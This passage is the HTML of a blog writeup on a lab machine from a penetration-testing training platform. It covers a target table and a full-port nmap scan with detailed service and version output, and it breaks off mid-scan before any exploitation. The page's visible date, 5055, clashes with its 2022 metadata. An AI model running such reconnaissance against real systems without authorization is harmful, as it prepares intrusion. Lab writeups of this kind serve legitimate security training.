@@ -1,0 +1,1569 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is a writeup of the Hollywood machine in PwnTillDawn Online platform.'><title>Hollywood PwnTillDawn Writeup</title>
+
+<link rel='canonical' href='https://AbdallahAdham.com/p/hollywood-pwntilldawn-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content='Hollywood PwnTillDawn Writeup'>
+<meta property='og:description' content='This is a writeup of the Hollywood machine in PwnTillDawn Online platform.'>
+<meta property='og:url' content='https://AbdallahAdham.com/p/hollywood-pwntilldawn-writeup/'>
+<meta property='og:site_name' content='Abdallah Adham'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PwnTillDawn' /><meta property='article:tag' content='PenTesting' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Exploit' /><meta property='article:tag' content='Vulnerability' /><meta property='article:published_time' content='2022-12-05T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-12-05T00:00:00&#43;00:00'/><meta property='og:image' content='https://AbdallahAdham.com/post/Hollywood_PwnTillDawn/hollywood_pwntilldawn.JPG' />
+<meta name="twitter:title" content="Hollywood PwnTillDawn Writeup">
+<meta name="twitter:description" content="This is a writeup of the Hollywood machine in PwnTillDawn Online platform."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://AbdallahAdham.com/post/Hollywood_PwnTillDawn/hollywood_pwntilldawn.JPG' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu75263645e29a61b75309ab4d02f07e73_73571_300x0_resize_q75_box.jpg" width="300"
+                            height="249" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Abdallah Adham</a></h1>
+            <h2 class="site-description">Penetration Tester</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/AbdallahAdham'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg width="16px" height="16px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.976 0A7.977 7.977 0 000 7.976c0 3.522 2.3 6.507 5.431 7.584.392.049.538-.196.538-.392v-1.37c-2.201.49-2.69-1.076-2.69-1.076-.343-.93-.881-1.175-.881-1.175-.734-.489.048-.489.048-.489.783.049 1.224.832 1.224.832.734 1.223 1.859.88 2.3.685.048-.538.293-.88.489-1.076-1.762-.196-3.621-.881-3.621-3.964 0-.88.293-1.566.832-2.153-.05-.147-.343-.978.098-2.055 0 0 .685-.196 2.201.832.636-.196 1.322-.245 2.007-.245s1.37.098 2.006.245c1.517-1.027 2.202-.832 2.202-.832.44 1.077.146 1.908.097 2.104a3.16 3.16 0 01.832 2.153c0 3.083-1.86 3.719-3.62 3.915.293.244.538.733.538 1.467v2.202c0 .196.146.44.538.392A7.984 7.984 0 0016 7.976C15.951 3.572 12.38 0 7.976 0z" fill="#000"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/abdallah-adham/'
+                        target="_blank"
+                        title="Linkedin"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve">
+<g id="XMLID_801_">
+	<path id="XMLID_802_" d="M72.16,99.73H9.927c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5H72.16c2.762,0,5-2.238,5-5V104.73
+		C77.16,101.969,74.922,99.73,72.16,99.73z"/>
+	<path id="XMLID_803_" d="M41.066,0.341C18.422,0.341,0,18.743,0,41.362C0,63.991,18.422,82.4,41.066,82.4
+		c22.626,0,41.033-18.41,41.033-41.038C82.1,18.743,63.692,0.341,41.066,0.341z"/>
+	<path id="XMLID_804_" d="M230.454,94.761c-24.995,0-43.472,10.745-54.679,22.954V104.73c0-2.761-2.238-5-5-5h-59.599
+		c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5h62.097c2.762,0,5-2.238,5-5v-98.918c0-33.333,9.054-46.319,32.29-46.319
+		c25.306,0,27.317,20.818,27.317,48.034v97.204c0,2.762,2.238,5,5,5H305c2.762,0,5-2.238,5-5V194.995
+		C310,145.43,300.549,94.761,230.454,94.761z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/AbdallahAdham13'
+                        target="_blank"
+                        title="Twitter"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve">
+<g id="XMLID_826_">
+	<path id="XMLID_827_" d="M302.973,57.388c-4.87,2.16-9.877,3.983-14.993,5.463c6.057-6.85,10.675-14.91,13.494-23.73
+		c0.632-1.977-0.023-4.141-1.648-5.434c-1.623-1.294-3.878-1.449-5.665-0.39c-10.865,6.444-22.587,11.075-34.878,13.783
+		c-12.381-12.098-29.197-18.983-46.581-18.983c-36.695,0-66.549,29.853-66.549,66.547c0,2.89,0.183,5.764,0.545,8.598
+		C101.163,99.244,58.83,76.863,29.76,41.204c-1.036-1.271-2.632-1.956-4.266-1.825c-1.635,0.128-3.104,1.05-3.93,2.467
+		c-5.896,10.117-9.013,21.688-9.013,33.461c0,16.035,5.725,31.249,15.838,43.137c-3.075-1.065-6.059-2.396-8.907-3.977
+		c-1.529-0.851-3.395-0.838-4.914,0.033c-1.52,0.871-2.473,2.473-2.513,4.224c-0.007,0.295-0.007,0.59-0.007,0.889
+		c0,23.935,12.882,45.484,32.577,57.229c-1.692-0.169-3.383-0.414-5.063-0.735c-1.732-0.331-3.513,0.276-4.681,1.597
+		c-1.17,1.32-1.557,3.16-1.018,4.84c7.29,22.76,26.059,39.501,48.749,44.605c-18.819,11.787-40.34,17.961-62.932,17.961
+		c-4.714,0-9.455-0.277-14.095-0.826c-2.305-0.274-4.509,1.087-5.294,3.279c-0.785,2.193,0.047,4.638,2.008,5.895
+		c29.023,18.609,62.582,28.445,97.047,28.445c67.754,0,110.139-31.95,133.764-58.753c29.46-33.421,46.356-77.658,46.356-121.367
+		c0-1.826-0.028-3.67-0.084-5.508c11.623-8.757,21.63-19.355,29.773-31.536c1.237-1.85,1.103-4.295-0.33-5.998
+		C307.394,57.037,305.009,56.486,302.973,57.388z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hollywood-pwntilldawn-writeup/">
+                
+                    <img src="/post/Hollywood_PwnTillDawn/hollywood_pwntilldawn.JPG" loading="lazy" alt="Featured image of post Hollywood PwnTillDawn Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pen-testing/" style="background-color: #2a9d8f; color: #fff;">
+                Pen-Testing
+            </a>
+        
+            <a href="/categories/web-security/" style="background-color: #2a9d8f; color: #fff;">
+                Web-Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hollywood-pwntilldawn-writeup/">Hollywood PwnTillDawn Writeup</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            This is a writeup of the Hollywood machine in PwnTillDawn Online platform.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">July 12, 5055</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    11 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<p>This writeup has been authorized by the <strong>PwnTillDawn Crew</strong>!</p>
+<p>Check their websites for more information!</p>
+<ol>
+<li><a class="link" href="https://www.wizlynxgroup.com/"  target="_blank" rel="noopener"
+    >wizlynxgroup</a></li>
+<li><a class="link" href="https://online.pwntilldawn.com/"  target="_blank" rel="noopener"
+    >online.pwntilldawn</a></li>
+</ol>
+<h2 id="target-information">Target Information</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Name</th>
+<th>IP</th>
+<th>Operating System</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Hollywood</strong></td>
+<td><strong>10.150.150.219</strong></td>
+<td><strong>Windows</strong></td>
+<td><strong>Easy</strong></td>
+</tr>
+</tbody>
+</table></div>
+<h2 id="scanning">Scanning</h2>
+<h3 id="nmap-scanning">Nmap Scanning</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap 10.150.150.219 -p- -A
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.150.150.219
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.064s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65491</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE        VERSION
+</span></span><span class="line"><span class="cl">21/tcp    open     ftp            FileZilla ftpd 0.9.41 beta
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  SYST: UNIX emulated by FileZilla
+</span></span><span class="line"><span class="cl">25/tcp    open     smtp           Mercury/32 smtpd <span class="o">(</span>Mail server account Maiser<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: localhost Hello nmap.scanme.org<span class="p">;</span> ESMTPs are:, TIME
+</span></span><span class="line"><span class="cl">79/tcp    open     finger         Mercury/32 fingerd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> finger: Login: Admin         Name: Mail System Administrator<span class="se">\x</span>0D
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="se">\x</span>0D
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_<span class="o">[</span>No profile information<span class="o">]</span><span class="se">\x</span>0D
+</span></span><span class="line"><span class="cl">80/tcp    open     http           Apache httpd 2.4.34 <span class="o">((</span>Win32<span class="o">)</span> OpenSSL/1.0.2o PHP/5.6.38<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.34 <span class="o">(</span>Win32<span class="o">)</span> OpenSSL/1.0.2o PHP/5.6.38
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Welcome to XAMPP
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was http://10.150.150.219/dashboard/
+</span></span><span class="line"><span class="cl">105/tcp   open     ph-addressbook Mercury/32 PH addressbook server
+</span></span><span class="line"><span class="cl">106/tcp   open     pop3pw         Mercury/32 poppass service
+</span></span><span class="line"><span class="cl">110/tcp   open     pop3           Mercury/32 pop3d
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_pop3-capabilities: USER TOP APOP EXPIRE<span class="o">(</span>NEVER<span class="o">)</span> UIDL
+</span></span><span class="line"><span class="cl">135/tcp   open     msrpc          Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">143/tcp   open     imap           Mercury/32 imapd 4.62
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_imap-capabilities: CAPABILITY <span class="nb">complete</span> X-MERCURY-1A0001 OK IMAP4rev1 <span class="nv">AUTH</span><span class="o">=</span>PLAIN
+</span></span><span class="line"><span class="cl">443/tcp   open     ssl/http       Apache httpd 2.4.34 <span class="o">((</span>Win32<span class="o">)</span> OpenSSL/1.0.2o PHP/5.6.38<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.34 <span class="o">(</span>Win32<span class="o">)</span> OpenSSL/1.0.2o PHP/5.6.38
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2009-11-10T23:48:47
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2019-11-08T23:48:47
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Welcome to XAMPP
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was https://10.150.150.219/dashboard/
+</span></span><span class="line"><span class="cl">445/tcp   open     microsoft-ds   Windows <span class="m">7</span> Ultimate <span class="m">7601</span> Service Pack <span class="m">1</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">554/tcp   open     rtsp?
+</span></span><span class="line"><span class="cl">1562/tcp  filtered pconnectmgr
+</span></span><span class="line"><span class="cl">1883/tcp  open     mqtt
+</span></span><span class="line"><span class="cl"><span class="p">|</span> mqtt-subscribe: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Topics and their most recent payloads: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     ActiveMQ/Advisory/MasterBroker: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    ActiveMQ/Advisory/Consumer/Topic/#: 
+</span></span><span class="line"><span class="cl">2224/tcp  open     http           Mercury/32 httpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Mercury HTTP Services
+</span></span><span class="line"><span class="cl">2869/tcp  open     http           Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">2882/tcp  filtered ndtp
+</span></span><span class="line"><span class="cl">3306/tcp  open     mysql          MariaDB <span class="o">(</span>unauthorized<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3521/tcp  filtered mc3ss
+</span></span><span class="line"><span class="cl">5672/tcp  open     amqp?
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_amqp-info: ERROR: AMQP:handshake connection closed unexpectedly <span class="k">while</span> reading frame header
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GetRequest, HTTPOptions, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    AMQP
+</span></span><span class="line"><span class="cl">8009/tcp  open     ajp13          Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ajp-methods: Failed to get a valid response <span class="k">for</span> the OPTION request
+</span></span><span class="line"><span class="cl">8080/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache Tomcat/7.0.56
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache-Coyote/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Apache Tomcat
+</span></span><span class="line"><span class="cl">8089/tcp  open     ssl/http       Splunkd httpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: splunkd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SplunkServerDefaultCert/organizationName<span class="o">=</span>SplunkUser
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2019-10-28T09:17:32
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-10-27T09:17:32
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_/
+</span></span><span class="line"><span class="cl">8161/tcp  open     http           Jetty 8.1.16.v20140903
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Jetty<span class="o">(</span>8.1.16.v20140903<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache ActiveMQ
+</span></span><span class="line"><span class="cl">8546/tcp  filtered unknown
+</span></span><span class="line"><span class="cl">10243/tcp open     http           Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">61613/tcp open     stomp          Apache ActiveMQ 5.10.1 - 5.11.1
+</span></span><span class="line"><span class="cl">61614/tcp open     http           Jetty 8.1.16.v20140903
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Error <span class="m">500</span> Server Error
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Jetty<span class="o">(</span>8.1.16.v20140903<span class="o">)</span>
+</span></span><span class="line"><span class="cl">61616/tcp open     apachemq       ActiveMQ OpenWire transport
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NULL: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     ActiveMQ
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     TcpNoDelayEnabled
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     SizePrefixDisabled
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     CacheSize
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     StackTraceEnabled
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     CacheEnabled
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     TightEncodingEnabled
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     MaxFrameSize
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     MaxInactivityDuration
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    MaxInactivityDurationInitalDelay
+</span></span><span class="line"><span class="cl">Service Info: Hosts: localhost, HOLLYWOOD<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows <span class="m">7</span> Ultimate <span class="m">7601</span> Service Pack <span class="m">1</span> <span class="o">(</span>Windows <span class="m">7</span> Ultimate 6.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: Hollywood
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: HOLLYWOOD<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
